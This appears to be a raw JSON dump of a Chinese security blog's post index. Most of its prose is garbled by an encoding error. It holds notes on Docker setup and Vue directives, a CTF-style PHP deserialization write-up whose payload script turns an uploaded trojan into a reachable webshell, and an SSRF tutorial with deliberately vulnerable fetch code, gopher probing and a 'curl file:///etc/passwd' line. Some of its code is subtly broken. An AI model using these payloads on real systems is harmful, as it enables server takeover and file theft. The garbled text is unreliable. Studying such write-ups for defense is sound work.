æ–‡ä»¶æ—¶ï¼Œ$_FILEè¿™ä¸ªå…¨å±€å˜é‡æ˜¯ä¸ºç©ºçš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç”¨GETè®¿é—®ç»•è¿‡ å¦‚æœextä¸º1ï¼Œåˆ™è¿›è¡Œç›¸åº”çš„æ–‡ä»¶æ“ä½œåœ¨åé¢çš„æ„é€ ä¸­ï¼Œå°†extè®¾ä¸º1å³å¯ã€‚ 12@copy($this-&gt;filename_tmp, $this-&gt;filename); //å¤åˆ¶æ–‡ä»¶@unlink($this-&gt;filename_tmp); å…³é”®æ“ä½œåœ¨ç¬¬3ç‚¹ï¼šç”¨copyå‡½æ•°ï¼Œå°†filename_tmpçš„å€¼è¦†ç›–åŸæ¥çš„æ–‡ä»¶åï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬æœ€ç»ˆæƒ³è¦æ“ä½œçš„åœ°æ–¹ï¼Œç”±å‰é¢å¯çŸ¥ï¼Œæˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬è¢«æ”¹åä¸”ä¸å¯ç”¨ï¼Œæˆ‘ä»¬çš„çªç ´ç‚¹æ˜¯å°†è¢«æ”¹äº†åçš„æ–‡ä»¶æ”¹æˆæˆ‘ä»¬å¸Œæœ›çš„æ–‡ä»¶åã€‚æ‰€ä»¥ï¼Œç»ˆæç›®æ ‡æ˜¯ï¼šè§¦å‘profileä¸­çš„img_upload()æ–¹æ³•ï¼Œä¸”ç»•è¿‡è¿›å…¥æ–‡ä»¶æ“ä½œå‰é¢çš„é‚£äº›åˆ¤æ–­ã€‚ é¦–å…ˆæ˜ç¡®è¿™ä¸ªæ“ä½œåœ¨profileç±»ä¸­ ç¬¬ä¸€ï¼Œæˆ‘ä»¬çš„åºåˆ—å·å­—ç¬¦ä¸²ä¸­éœ€è¦ä¸€ä¸ªprofileç±»æ¥é€šè¿‡ä¸€äº›æ‰‹æ®µæ¥è§¦å‘è¿™ä¸ªå‡½æ•°ã€‚ ç¬¬äºŒï¼Œå¦‚ä½•æ‰èƒ½è§¦å‘è¿™ä¸ªç±»ä¸­çš„æ–¹æ³•ï¼Ÿå…³æ³¨_ call()ã€ _ _get() ã€ destruct()è¿™ä¸‰ä¸ªå‡½æ•° é¦–å…ˆçœ‹__destruct()å‡½æ•°ï¼š 1234567Register.phppublic function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125; ä¼šè°ƒç”¨checkerä¸­çš„indexæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆæ‰èƒ½åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥å‘¢ï¼Ÿé¦–å…ˆæ˜¯è§£å†³å¦‚ä½•è§¦å‘profileä¸­çš„é­”æœ¯æ–¹æ³• å†çœ‹__call() 123456public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; ä»£ç æ„æ€ä¸ºï¼Œå½“æ‰€è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶ï¼Œä¼šè¿›è¡Œä¸‹é¢çš„æ“ä½œï¼Œç»“åˆdestructä¸­çš„ä»£ç ï¼Œå¦‚æœæˆ‘ä»¬çš„checkerå½“æ—¶åºåˆ—åŒ–çš„æ˜¯profileï¼Œåœ¨destructçš„æ—¶å€™ï¼Œä¼šè°ƒç”¨index()æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•åœ¨profileä¸­æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥è§¦å‘callæ–¹æ³•ï¼Œåˆ°äº†callæ–¹æ³•åï¼Œæ³¨æ„è¿™é‡Œï¼š$this-&gt;{$this-&gt;$name}()ï¼Œæ­¤æ—¶ï¼Œ$nameä¸ºä¹‹å‰ä¼ å…¥çš„indexï¼Œè¿™é‡Œ$this-&gt;$nameå˜ä¸ºäº†è°ƒç”¨å±æ€§ã€‚å½“è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§åæ—¶ï¼Œä¼šè§¦å‘__get()æ–¹æ³•ï¼Œçœ‹çœ‹ä»£ç ï¼š 1234public function __get($name) &#123; return $this-&gt;except[$name]; &#125; ä¼šè¿”å›except[$name]çš„å€¼ï¼Œæ³¨æ„ï¼æˆ‘ä»¬çš„ç»ˆæç›®æ ‡æ˜¯è§¦å‘img_upload()å‡½æ•°ï¼è¿™é‡Œå°±æ˜¯çªç ´ç‚¹ï¼Œå¦‚æœæˆ‘ä»¬æŠŠexceptèµ‹å€¼ä¸ºï¼š$except[index=&gt;â€™upload_imgâ€™]çš„è¯ï¼Œé‚£getå‡½æ•°è¿”å›çš„å€¼ä¸ºupload_imgï¼Œåœ¨callå‡½æ•°ä¸­ï¼Œå°±å˜æˆäº† $this -&gt; upload_img()ï¼Œå°±æˆåŠŸè§¦å‘äº†upload_imgå‡½æ•°ã€‚ payloadä¸‹é¢æˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹payloadã€‚ 12345678910111213141516171819202122232425262728&lt;?phpnamespace app\\web\\controller;class Profile &#123; //ç»•è¿‡ç™»å½•åˆ¤æ–­ public $checker=0; public $filename_tmp=&quot;../public/upload/1.png&quot;; public $filename=&quot;../public/upload/fxxy.php&quot;; public $upload_menu; //ç»•è¿‡æ–‡ä»¶åç¼€ååˆ¤æ–­ public $ext=1; public $img; //è§¦å‘upload_img() public $except=array(&#x27;index&#x27;=&gt;&#x27;upload_img&#x27;);&#125;class Register &#123; public $checker; public $registed=0;&#125;$a=new Register();$a-&gt;checker=new Profile();$a-&gt;checker-&gt;checker = 0;// echo serialize($a);echo base64_encode(serialize($a));?&gt; ç„¶åç”¨ç”Ÿæˆçš„payloadæ›¿æ¢æˆ‘ä»¬çš„cookie å¯ä»¥çœ‹åˆ°æ–‡ä»¶åå·²ç»æ”¹äº† èšğŸ—¡è¿æ¥ï¼Œgetshellã€‚ æ”¶è· å¯¹äºPOPé“¾çš„æ„é€ åŠ æ·±äº†ç†è§£ï¼Œæ‰¾åˆ°ååºåˆ—åŒ–ç‚¹åï¼Œä¸€èˆ¬å…ˆå…¨å±€æœç´¢ç›¸å…³çš„é­”æ³•å‡½æ•°ï¼Œçœ‹è¿™äº›å‡½æ•°èƒ½å¦é€šè¿‡ç›¸å…³çš„æ‰‹æ®µä¸²è”èµ·æ¥è¾¾åˆ°æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„ PHPçš„namespaceç†è§£ã€‚https://www.runoob.com/w3cnote/php-namespace-intro.html","categories":[],"tags":[]},{"title":"dockerå­¦ä¹ ç¬”è®°","slug":"dockerç¬”è®°","date":"2019-10-29T16:00:00.000Z","updated":"2021-10-22T08:30:23.009Z","comments":true,"path":"2019/10/30/dockerç¬”è®°/","link":"","permalink":"http://example.com/2019/10/30/docker%E7%AC%94%E8%AE%B0/","excerpt":"ä¸ºä»€ä¹ˆè¦å­¦dockerï¼Ÿå› ä¸ºæ­ç¯å¢ƒå¤ªç´¯äº†ï¼ï¼","text":"ä¸ºä»€ä¹ˆè¦å­¦dockerï¼Ÿå› ä¸ºæ­ç¯å¢ƒå¤ªç´¯äº†ï¼ï¼ é¦–å…ˆæ˜ç¡®dockeræ˜¯ä»€ä¹ˆï¼š æ˜¯ä¸€ä¸ªç”¨äºå¼€å‘ï¼Œäº¤ä»˜å’Œè¿è¡Œåº”ç”¨ç¨‹åºçš„å¼€æ”¾å¹³å°ã€‚Docker ä½¿æ‚¨èƒ½å¤Ÿå°†åº”ç”¨ç¨‹åºä¸åŸºç¡€æ¶æ„åˆ†å¼€ï¼Œä»è€Œå¯ä»¥å¿«é€Ÿäº¤ä»˜è½¯ä»¶ã€‚ è¯´ç™½äº†ï¼Œå°±æ˜¯ä¸€ä¸ªé›†æˆç¯å¢ƒï¼Œé‡Œé¢åŒ…å«ä½ éœ€è¦çš„åº”ç”¨å’Œç›¸åº”é…ç½® ä¼˜ç‚¹ï¼š å¿«é€Ÿï¼Œä¸€è‡´åœ°äº¤ä»˜æ‚¨çš„åº”ç”¨ç¨‹åºã€‚ å“åº”å¼éƒ¨ç½²å’Œæ‰©å±•ã€‚Docker æ˜¯åŸºäºå®¹å™¨çš„å¹³å°ï¼Œå…è®¸é«˜åº¦å¯ç§»æ¤çš„å·¥ä½œè´Ÿè½½ã€‚Docker å®¹å™¨å¯ä»¥åœ¨å¼€å‘äººå‘˜çš„æœ¬æœºä¸Šï¼Œæ•°æ®ä¸­å¿ƒçš„ç‰©ç†æˆ–è™šæ‹Ÿæœºä¸Šï¼Œäº‘æœåŠ¡ä¸Šæˆ–æ··åˆç¯å¢ƒä¸­è¿è¡Œã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œéšæ—¶éšåœ°è½»æ¾å¯åŠ¨ã€‚ åœ¨åŒä¸€ç¡¬ä»¶ä¸Šè¿è¡Œæ›´å¤šå·¥ä½œè´Ÿè½½ã€‚Docker è½»å·§å¿«é€Ÿã€‚å®ƒä¸ºåŸºäºè™šæ‹Ÿæœºç®¡ç†ç¨‹åºçš„è™šæ‹Ÿæœºæä¾›äº†å¯è¡Œã€ç»æµã€é«˜æ•ˆçš„æ›¿ä»£æ–¹æ¡ˆï¼Œå› æ­¤æ‚¨å¯ä»¥åˆ©ç”¨æ›´å¤šçš„è®¡ç®—èƒ½åŠ›æ¥å®ç°ä¸šåŠ¡ç›®æ ‡ã€‚ ç¿»è¯‘æˆç™½è¯å°±æ˜¯ï¼šè½»é‡ã€å†…å­˜æ¶ˆè€—è¾ƒå° æœ¬æ–‡ä»¥å®‰è£…redisç¯å¢ƒä¸ºä¾‹ å®‰è£…Dockerç¯å¢ƒ Ubuntuï¼š18.04.2 å…ˆæŠŠæºæ›´æ–°ä¸ºé˜¿é‡Œæº1$ vim /etc/apt/sources.list å°†æ–‡ä»¶ä¸­çš„å†…å®¹å…¨éƒ¨æ³¨é‡Šæ‰ï¼Œæ–°å¢ä»¥ä¸‹å†…å®¹ 12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable# deb-src [arch=amd64] https://download.docker.com/linux/ubuntu bionic stabledeb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable# deb-src [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable# deb-src [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable å¤šè¯´ä¸€ä¸ªå‘ï¼Œå¦‚æœä¸Šè¿°æ³¨é‡Šçš„å†…å®¹æ²¡æœ‰æ³¨é‡Šçš„è¯ï¼Œä¼šæŠ¥é”™ æ„æ€å°±æ˜¯è¿™ä¸ªæºæ²¡æœ‰äº†ï¼Œä½†æ˜¯å¯èƒ½å°±ä¼šé™·å…¥ä¸€ä¸ªè¯¯åŒºï¼Œè¿™ä¸ªæºæ²¡æœ‰äº†ï¼Œé‚£æˆ‘çš„è½¯ä»¶å°±è£…ä¸äº†äº†ï¼Œå…¶å®ä¸æ˜¯ï¼Œè¿™åªæ˜¯ä¸€ä¸ªæºé™¤äº†é—®é¢˜ï¼Œå°†è¿™ä¸ªå‡ºé”™çš„æºremoveåï¼Œå…¶ä½™çš„æºä¼šè‡ªåŠ¨å†æ¬¡å¸®æˆ‘ä»¬å¯»æ‰¾æˆ‘ä»¬æƒ³è¦çš„è½¯ä»¶ï¼Œå‘½ä»¤å¦‚ä¸‹ 1sudo add-apt-repository --remove aliyun:/docker-engine/apt/repo ç›¸å…³removeåé¢çš„å‚æ•°ï¼Œæ ¹æ®è‡ªå·±çš„æŠ¥é”™ä¿¡æ¯æ›´æ”¹ï¼Œæˆ‘çš„æ˜¯ï¼šhttp://mirrors.aliyun.com/docker-engine/apt/repoï¼ŒæŒ‰ç…§ç›¸åº”æ ¼å¼è¿›è¡Œæ›¿æ¢ï¼šæºå:å‡ºé”™ä»“åº“ å®‰è£…è¯ä¹¦1sudo apt-get install apt-transport-https ca-certificates curl software-properties-common å®‰è£…dockerå®˜æ–¹å…¬é’¥12root@fxxy-virtual-machine:/# curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -OK æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸ 12345root@fxxy-virtual-machine:/# sudo apt-key fingerprint 0EBFCD88pub rsa4096 2017-02-22 [SCEA] 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88uid [ æœªçŸ¥ ] Docker Release (CE deb) &lt;docker@docker.com&gt;sub rsa4096 2017-02-22 [S] å®‰è£…docker1sudo apt-get -y install docker-ce æ£€æµ‹å®‰è£…æˆåŠŸ1sudo docker run hello-world å®‰è£…æˆåŠŸä¼šè¾“å‡ºä»¥ä¸‹å†…å®¹ 123456789101112131415161718192021222324252627root@fxxy-virtual-machine:/# sudo docker run hello-worldUnable to find image &#x27;hello-world:latest&#x27; locallylatest: Pulling from library/hello-world0e03bdcc26d7: Pull complete Digest: sha256:d58e752213a51785838f9eed2b7a498ffa1cb3aa7f946dda11af39286c3db9a9Status: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/get-started/ å®‰è£…redisæ‹‰å–1docker pull redis:latest æŸ¥çœ‹å®‰è£…1docker images æ˜ å°„æœåŠ¡1docker run -itd --name redis-test -p 6379:6379 redis -p 6379:6379ï¼šå°†redisçš„6379ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„6379ç«¯å£ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡è®¿é—®å®¿ä¸»æœºçš„IPæ¥è®¿é—®redisæœåŠ¡ æŸ¥çœ‹è¿è¡Œ1docker ps å¯ä»¥çœ‹åˆ°è¿è¡Œçš„dockeræœåŠ¡ä¸­å‡ºç°redis è®¿é—®æœåŠ¡1docker exec -it redis-test /bin/bash è¿™æ®µå‘½ä»¤çš„ä½œç”¨ï¼š execï¼šåœ¨è¿è¡Œçš„å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤ -itï¼šè¿›å…¥å®¹å™¨çš„ç»ˆç«¯å¹¶è·å¾—è¾“å…¥ é‚£åˆèµ·æ¥å°±æ˜¯ï¼Œä½¿ç”¨redies-testè¿™ä¸ªå®¹å™¨ï¼Œå¹¶åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ç»™åˆ°æˆ‘ä»¬ ç”¨redis-cliç™»å½•redisæœåŠ¡ é€€å‡ºå½“å‰å®¹å™¨å¿«æ·é”®ä¸ºctrl-Dã€‚","categories":[],"tags":[{"name":"docker,ç¯å¢ƒæ­å»º","slug":"docker-ç¯å¢ƒæ­å»º","permalink":"http://example.com/tags/docker-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"vue åŸºç¡€æŒ‡ä»¤å­¦ä¹ ","slug":"vueåŸºç¡€æŒ‡ä»¤","date":"2019-10-26T16:00:00.000Z","updated":"2021-10-22T08:32:51.653Z","comments":true,"path":"2019/10/27/vueåŸºç¡€æŒ‡ä»¤/","link":"","permalink":"http://example.com/2019/10/27/vue%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/","excerpt":"â€¦..","text":"â€¦.. æ˜¾ç¤ºæ•°æ®html 123&lt;div id=&quot;app&quot;&gt; &#123;&#123; message &#125;&#125; &lt;/div&gt; js 12345678new Vue( &#123; el: &#x27;#app&#x27;, data:&#123; message:&#x27;hello vue&#x27; &#125; &#125;) v-html å¯¹ç»‘å®šçš„å±æ€§è¿›è¡Œhtmlæ¸²æŸ“ 123&lt;div id=&quot;app&quot;&gt; &lt;div v-html=&quot;message&quot;&gt;&lt;/div&gt;&lt;/div&gt; js 123456new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; message: &#x27;&lt;h1&gt;fxxy&lt;/h1&gt;&#x27; &#125;&#125;) v-html &amp; v-text v-htmlä¼šå¯¹ç»‘å®šçš„å±æ€§è¿›è¡Œæ¸²æŸ“ï¼Œå¦‚æœå†…å®¹ä¸­æœ‰htmlæ ‡ç­¾ï¼Œåˆ™åœ¨é¡µé¢ä¸­ä¸ä¼šå‡ºç°ï¼Œè€Œv-textåˆ™ä¸ä¼šè¿›è¡Œæ¸²æŸ“ï¼Œå¦‚æœå†…å®¹ä¸­æœ‰htmlæ ‡ç­¾ï¼Œåˆ™ä¼šä»¥æºç æ˜¾ç¤º v-on ä¸ºhtmlä¸­çš„å…ƒç´ ç»‘å®šäº‹ä»¶ï¼Œç›‘å¬ DOM äº‹ä»¶ï¼Œè§¦å‘methods,ç¼©å†™ä¸º@ 1234&lt;div id=&quot;app5&quot;&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;button v-on:click=&quot;reverseMessage&quot;&gt; é€†è½¬æ¶ˆæ¯ &lt;/button&gt; &lt;/div&gt; js 12345678910111213new Vue( &#123; el:&#x27;#app5&#x27;, data:&#123; message:&#x27;å¼ å³»å±±æ˜¯çŒªï¼&#x27; &#125;, methods:&#123; reverseMessage:function()&#123; this.message = this.message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125; &#125; &#125;); v-bind ä¸ºhtmlä¸­çš„å…ƒç´ ç»‘å®šdataå±æ€§ï¼Œv-bind æŒ‡ä»¤è¢«ç”¨æ¥å“åº”åœ°æ›´æ–° HTML å±æ€§ï¼Œç¼©å†™ä¸º : html 12345678&lt;div id=&quot;app2&quot;&gt; &lt;span v-bind:title=&quot;date&quot;&gt; é¼ æ ‡æ‚¬åœå‡ ç§’é’ŸæŸ¥çœ‹æ­¤å¤„åŠ¨æ€ç»‘å®šçš„æç¤ºä¿¡æ¯ï¼ &lt;/span&gt; &lt;a v-bind:href=&quot;url&quot;&gt;&lt;/a&gt; &lt;a :target=&quot;url&quot;&gt;&lt;/a&gt; &lt;/div&gt; js 12345678910new Vue ( &#123; el:&#x27;#app2&#x27;, data:&#123; date:&#x27;é¡µé¢åŠ è½½ä¸&#x27; + new Date().toLocaleString(), url:&#x27;www.google.com&#x27;, target:&#x27;_blank&#x27; &#125; &#125;); v-if ã€v-else ã€v-else-ifhtml 1234567891011121314&lt;div id=&quot;app3&quot;&gt; &lt;div v-if=&quot;type === A&quot;&gt; A &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt; B &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt; C &lt;/div&gt; &lt;div v-else&gt; Not A/B/C &lt;/div&gt;&lt;/div&gt; js 12345678new Vue( &#123; el:&#x27;#app3&#x27;, data:&#123; type:&#x27;A&#x27;, &#125; &#125;); v-show123&lt;div id=&quot;app&quot;&gt; &lt;h1 v-show=&quot;ok&quot;&gt;Hello!&lt;/h1&gt;&lt;/div&gt; js 123456new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; ok: true &#125;&#125;) v-if å’Œv-showçš„åŒºåˆ« v-if æ˜¯åŠ¨æ€æ·»åŠ ï¼Œå½“å€¼ä¸º false æ—¶ï¼Œæ˜¯å®Œå…¨ç§»é™¤è¯¥å…ƒç´ ï¼Œå³ dom æ ‘ä¸­ä¸å­˜åœ¨è¯¥å…ƒç´ ã€‚ v-show ä»…æ˜¯éšè— / æ˜¾ç¤ºï¼Œå€¼ä¸º false æ—¶ï¼Œè¯¥å…ƒç´ ä¾æ—§å­˜åœ¨äº dom æ ‘ä¸­ã€‚è‹¥å…¶åŸæœ‰æ ·å¼è®¾ç½®äº† display: none åˆ™ä¼šå¯¼è‡´å…¶æ— æ³•æ­£å¸¸æ˜¾ç¤ºã€‚ å¦‚æœéœ€è¦é¢‘ç¹åˆ‡æ¢ v-show è¾ƒå¥½ï¼Œå¦‚æœåœ¨è¿è¡Œæ—¶æ¡ä»¶ä¸å¤§å¯èƒ½æ”¹å˜ v-if è¾ƒå¥½ã€‚ v-forhtml 1234567&lt;div id=&quot;app4&quot;&gt; &lt;ul&gt; &lt;li v-for = &#x27;todo in todos&#x27;&gt; &#123;&#123;todo.text&#125;&#125; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; js 123456789101112new Vue( &#123; el:&#x27;#app4&#x27;, data:&#123; todos:[ &#123;text:&quot;zjs is a pig&quot;&#125;, &#123;text:&quot;zjs is a big pig&quot;&#125;, ] &#125; &#125;); v-model å®ç°åŒå‘æ•°æ®ç»‘å®š 12345&lt;div id=&quot;app6&quot;&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;input v-model=&quot;message&quot;&gt; &lt;/div&gt; js 12345&lt;div id=&quot;app6&quot;&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;input v-model=&quot;message&quot;&gt; &lt;/div&gt; ref12&lt;input type=&quot;text&quot; ref=&quot;name&quot; v-on:keyup=&quot;logName&quot;&gt;this.name=this.$refs.name.value","categories":[],"tags":[]},{"title":"SSRF-æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ","slug":"SSRF","date":"2019-09-25T16:00:00.000Z","updated":"2021-10-22T08:31:18.354Z","comments":true,"path":"2019/09/26/SSRF/","link":"","permalink":"http://example.com/2019/09/26/SSRF/","excerpt":"SSRFï¼šæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´ åŸç†ï¼šç”±æ”»å‡»è€…æ„é€ çš„æ”»å‡»é“¾æ¥ä¼ ç»™æœåŠ¡ç«¯æ‰§è¡Œé€ æˆçš„æ¼æ´ï¼Œä¸€èˆ¬ç”¨åœ¨å¤–ç½‘æ¢æµ‹æˆ–æ”»å‡»å†…ç½‘æœåŠ¡ã€‚æ¼æ´å¤§å¤šæ•°å‘ç”Ÿåœ¨è¿æ¥å¤–ç½‘ä¸å†…ç½‘çš„è·³æ¿æœºä¸­ æˆå› ï¼šæœåŠ¡å™¨æœªå¯¹å‘èµ·è¯·æ±‚çš„URLè¿›è¡Œæœ‰æ•ˆæ£€æµ‹å’Œè¿‡æ»¤ã€‚ å“ªäº›åœ°æ–¹å®¹æ˜“å‡ºç°SSRFï¼š ç½‘ç«™çš„åˆ†äº«åŠŸèƒ½ åœ¨çº¿ç¿»è¯‘ï¼Œé€šè¿‡URLåœ°å€è¿›è¡Œç¿»è¯‘ PCåˆ°æ‰‹æœºçš„è½¬ç æœåŠ¡ï¼ˆé€šè¿‡urlæŠŠåŸç½‘å€å†…å®¹è½¬æˆé€‚åˆæ‰‹æœºé˜…è¯»çš„æƒ…å†µï¼‰ å›¾ç‰‡æ–‡ç« çš„åŠ è½½ã€ä¸‹è½½ã€æ”¶è— â€¦â€¦..","text":"SSRFï¼šæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´ åŸç†ï¼šç”±æ”»å‡»è€…æ„é€ çš„æ”»å‡»é“¾æ¥ä¼ ç»™æœåŠ¡ç«¯æ‰§è¡Œé€ æˆçš„æ¼æ´ï¼Œä¸€èˆ¬ç”¨åœ¨å¤–ç½‘æ¢æµ‹æˆ–æ”»å‡»å†…ç½‘æœåŠ¡ã€‚æ¼æ´å¤§å¤šæ•°å‘ç”Ÿåœ¨è¿æ¥å¤–ç½‘ä¸å†…ç½‘çš„è·³æ¿æœºä¸­ æˆå› ï¼šæœåŠ¡å™¨æœªå¯¹å‘èµ·è¯·æ±‚çš„URLè¿›è¡Œæœ‰æ•ˆæ£€æµ‹å’Œè¿‡æ»¤ã€‚ å“ªäº›åœ°æ–¹å®¹æ˜“å‡ºç°SSRFï¼š ç½‘ç«™çš„åˆ†äº«åŠŸèƒ½ åœ¨çº¿ç¿»è¯‘ï¼Œé€šè¿‡URLåœ°å€è¿›è¡Œç¿»è¯‘ PCåˆ°æ‰‹æœºçš„è½¬ç æœåŠ¡ï¼ˆé€šè¿‡urlæŠŠåŸç½‘å€å†…å®¹è½¬æˆé€‚åˆæ‰‹æœºé˜…è¯»çš„æƒ…å†µï¼‰ å›¾ç‰‡æ–‡ç« çš„åŠ è½½ã€ä¸‹è½½ã€æ”¶è— â€¦â€¦.. ç›¸å…³å‡½æ•°ä»¥ä¸‹ä»£ç demoï¼Œéƒ½æœªå¯¹ä¼šå‘èµ·è¯·æ±‚çš„URLå‚æ•°è¿›è¡Œè¿‡æ»¤æ£€æµ‹è€ŒæœåŠ¡å™¨ç›´æ¥è¿›è¡Œè¯·æ±‚ get_file_content() 12345678910&lt;?phpif (isset($_POST[&#x27;url&#x27;])) &#123; $content = file_get_contents($_POST[&#x27;url&#x27;]); $filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; file_put_contents($filename, $content); echo $_POST[&#x27;url&#x27;]; $img = &quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; &#125;echo $img;?&gt; fsockopen() 1234567891011121314151617181920&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \\n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .= &quot;\\r\\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; curl_exec() 123456789101112131415&lt;?php if (isset($_POST[&#x27;url&#x27;])) &#123; $link = $_POST[&#x27;url&#x27;]; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; file_put_contents($filename, $result); echo $result;&#125;?&gt; ç›¸å…³åè®®gophergopheråè®®ï¼Œæœ€æ—©å‡ºç°åœ¨tcp ipåè®®ä¹‹å‰ï¼Œå¯ä»¥ç”¨å®ƒæ¥å‘æŒ‡å®šçš„åœ°å€å’Œç«¯å£å‘é€GETã€POSTè¯·æ±‚ æ ¼å¼ 1gopher://&lt;host&gt;:&lt;port&gt;/_ + TCP/IPæ•°æ® é»˜è®¤ç«¯å£ï¼š70ã€‚å¦‚æœåœ¨ä½¿ç”¨gopheråè®®æ—¶æœªæŒ‡å®šç›¸å…³çš„ç«¯å£ï¼Œåˆ™é»˜è®¤å‘é€åˆ°ä¸»æœºåœ°å€çš„70ç«¯å£ å®è·µ åœ¨test.phpä¸­å†™å…¥ 12345&lt;?php$a = $_GET[&#x27;test&#x27;];echo $a;?&gt; ç”¨burpæŠ“å–ä¸€ä¸ªæµé‡åŒ…åï¼Œå°†å†…å®¹è¿›è¡Œurlç¼–ç  ç„¶åæ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥å‘½ä»¤ 1curl gooher://127.0.0.1:80/_æ•°æ®åŒ…ç¼–ç åçš„å†…å®¹ ç„¶åé¡µé¢è¿›è¡Œç›¸åº”è¾“å‡ºï¼Œå¦‚æœè¦ä¼ POSTåŒ…ï¼Œåˆ™å°†åŒ…è¿›è¡Œç›¸åº”ç¼–ç åˆ™å¯ dict dictæ˜¯åŸºäºæŸ¥è¯¢å“åº”çš„TCPåè®®ã€‚ é»˜è®¤ç«¯å£ï¼š2628 æ ¼å¼ï¼š 1dict://&lt;host&gt;:&lt;port&gt; å®è·µ ç«¯å£æ¢æµ‹ï¼šå¯¹80ã€22ã€3306è¿›è¡Œæ¢æµ‹ file è®¡ç®—æœºæœ¬åœ°çš„fileåè®®ï¼Œå¯ä»¥æŸ¥çœ‹ç›¸åº”çš„æ–‡ä»¶ï¼Œfileçš„è·¯å¾„éœ€æ˜¯ç»å¯¹è·¯å¾„ å®è·µ 1curl file:///etc/passwd SSRFæœ¬åœ°å®è·µåœ¨ssrf.phpä¸­ï¼Œå†™å…¥ä¸€æ®µå¹¿ä¸ºæµä¼ çš„å¯ä»¥é€ æˆSSRFæ¼æ´çš„ä»£ç  1234567891011121314151617function curl($curl)&#123; // åˆå§‹åŒ–ä¸€ä¸ªæ–°cURLèµ„æº $ch = curl_init(); // è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹,å°†å¯¹åº”çš„å€¼èµ‹ç»™$chå¥æŸ„ curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_HEADER,0); //æ‰§è¡Œ curl_exec($ch); //å…³é—­èµ„æº curl_close($ch);&#125;$curl = $_GET[&#x27;url&#x27;];curl($curl); 